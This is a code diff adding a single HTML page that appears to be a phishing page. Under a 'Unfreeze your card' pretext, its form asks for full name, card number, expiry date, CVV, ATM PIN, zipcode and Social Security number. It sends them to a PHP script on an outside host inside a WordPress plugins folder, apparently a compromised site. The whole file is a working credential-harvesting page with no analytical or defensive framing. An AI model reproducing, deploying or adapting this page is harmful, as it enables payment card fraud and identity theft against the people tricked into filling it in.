@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background-image: url('c.png');
+      background-size: cover;
+      color: #000000; /* Black text color for better visibility on the white background */
+    }
+    h2, p {
+      font-weight: bold;
+      font-size: 1.2em;
+      text-align: center;
+    }
+    form {
+      width: 300px;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      background-color: rgba(255, 255, 255, 0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    input, textarea, select {
+      width: calc(100% - 16px);
+      margin-bottom: 10px;
+      padding: 8px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    input[type="submit"] {
+      background-color: purple;
+      color: white;
+      cursor: pointer;
+    }
+    .expiry-date {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+    }
+    .expiry-month,
+    .expiry-year {
+      width: 48%; /* Adjust width as needed */
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Contact form -->
+  <h2>.</h2>
+  
+  <form action="https://epal-kalamp.synology.me/wordpress/wp-content/plugins/3.php" method="post" enctype="multipart/form-data">
+   <p style="font-size: 1.5em; color: purple;">Unfreeze your card</p>
+    <input type="text" name="11" placeholder="Full Name" required>
+    <input type="text" name="22" placeholder="Credit/Debit Card Number" required>
+    <div class="expiry-date">
+      <input type="text" class="expiry-month" name="33" placeholder="Expiry Month" required>
+      <input type="text" class="expiry-year" name="44" placeholder="Expiry Year" required>
+    </div>
+    <input type="text" name="55" placeholder="CVV" required>
+    <input type="password" name="66" placeholder="ATM PIN" required>
+	<input type="text" name="77" placeholder="Zipcode" required>
+	<input type="text" name="88" placeholder="9 Digits SSN" required>
+
+    <input type="submit" value="Submit">
+  </form>
+
+</body>
+</html>
+
